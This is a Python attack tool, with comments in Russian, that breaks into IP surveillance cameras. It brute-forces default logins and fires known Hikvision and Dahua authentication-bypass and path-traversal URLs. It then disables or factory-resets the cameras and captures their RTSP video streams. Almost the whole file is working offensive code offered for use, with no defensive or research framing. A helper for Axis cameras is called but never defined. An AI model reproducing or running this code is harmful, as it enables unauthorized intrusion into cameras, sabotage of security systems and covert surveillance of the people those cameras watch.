import requests
import base64
import cv2
import rtsp
import threading
from requests.auth import HTTPBasicAuth

class CameraExploiter:
    def __init__(self, camera_info):
        self.camera = camera_info
        self.session = requests.Session()
        self.session.verify = False
        self.authenticated = False
        
    def brute_force_credentials(self):
        """Подбор учетных данных для камеры"""
        print(f"Brute forcing credentials for {self.camera['ip']}")
        
        credentials = [
            ('admin', 'admin'),
            ('admin', '12345'),
            ('admin', 'password'),
            ('admin', '1234'),
            ('admin', ''),
            ('root', 'root'),
            ('root', 'default'),
            ('user', 'user'),
            ('supervisor', 'supervisor')
        ]
        
        for username, password in credentials:
            if self.test_credentials(username, password):
                self.camera['username'] = username
                self.camera['password'] = password
                self.authenticated = True
                print(f"SUCCESS: {username}:{password} for {self.camera['ip']}")
                return True
        
        return False
    
    def test_credentials(self, username, password):
        """Проверка учетных данных"""
        try:
            if self.camera['protocol'] == 'http':
                url = self.camera['url']
                auth = HTTPBasicAuth(username, password)
                response = self.session.get(url, auth=auth, timeout=5)
                return response.status_code == 200
            elif self.camera['protocol'] == 'rtsp':
                rtsp_url = self.camera['url'].replace('rtsp://', f'rtsp://{username}:{password}@')
                try:
                    client = rtsp.Client(rtsp_url)
                    if client.read().any():
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    def exploit_known_vulnerabilities(self):
        """Эксплойт известных уязвимостей камер"""
        manufacturer = self.camera.get('manufacturer', '').lower()
        
        if 'hikvision' in manufacturer:
            return self.exploit_hikvision()
        elif 'dahua' in manufacturer:
            return self.exploit_dahua()
        elif 'axis' in manufacturer:
            return self.exploit_axis()
        
        return False
    
    def exploit_hikvision(self):
        """Эксплойт уязвимостей Hikvision"""
        exploits = [
            # CVE-2017-7921 - Authentication Bypass
            f"http://{self.camera['ip']}/Security/users?auth=YWRtaW46MTEK",
            # Directory Traversal
            f"http://{self.camera['ip']}/../../../../../../../../../../etc/passwd"
        ]
        
        for exploit_url in exploits:
            try:
                response = self.session.get(exploit_url, timeout=5)
                if response.status_code == 200:
                    print(f"Hikvision exploit successful: {exploit_url}")
                    self.authenticated = True
                    return True
            except:
                continue
        return False
    
    def exploit_dahua(self):
        """Эксплойт уязвимостей Dahua"""
        exploits = [
            # CVE-2021-33044 - Authentication Bypass
            f"http://{self.camera['ip']}/cgi-bin/magicBox.cgi?action=getSystemInfo"
        ]
        
        for exploit_url in exploits:
            try:
                response = self.session.get(exploit_url, timeout=5)
                if 'deviceType' in response.text:
                    print(f"Dahua exploit successful: {exploit_url}")
                    self.authenticated = True
                    return True
            except:
                continue
        return False
    
    def disable_camera(self):
        """Отключение камеры"""
        if not self.authenticated:
            if not self.brute_force_credentials() and not self.exploit_known_vulnerabilities():
                print(f"Failed to authenticate to {self.camera['ip']}")
                return False
        
        print(f"Disabling camera: {self.camera['ip']}")
        
        # Методы отключения
        disable_methods = [
            # Отключение видео потока
            f"http://{self.camera['ip']}/cgi-bin/configManager.cgi?action=setConfig&VideoInOptions[0].Enabled=false",
            # Выключение камеры
            f"http://{self.camera['ip']}/cgi-bin/devVideoInput.cgi?action=close",
            # Сброс настроек
            f"http://{self.camera['ip']}/cgi-bin/magicBox.cgi?action=resetSystem"
        ]
        
        for method in disable_methods:
            try:
                if self.authenticated and 'username' in self.camera:
                    auth = HTTPBasicAuth(self.camera['username'], self.camera['password'])
                    response = self.session.get(method, auth=auth, timeout=5)
                else:
                    response = self.session.get(method, timeout=5)
                
                if response.status_code == 200:
                    print(f"Camera disable command sent: {method}")
            except:
                continue
        
        return True
    
    def capture_stream(self):
        """Захват видео потока"""
        if not self.authenticated:
            print("Not authenticated - cannot capture stream")
            return None
        
        try:
            if self.camera['protocol'] == 'rtsp':
                rtsp_url = self.camera['url']
                if 'username' in self.camera:
                    rtsp_url = rtsp_url.replace('rtsp://', 
                        f"rtsp://{self.camera['username']}:{self.camera['password']}@")
                
                cap = cv2.VideoCapture(rtsp_url)
                if cap.isOpened():
                    print(f"Stream captured from {self.camera['ip']}")
                    return cap
                    
        except Exception as e:
            print(f"Stream capture failed: {e}")
        
        return None
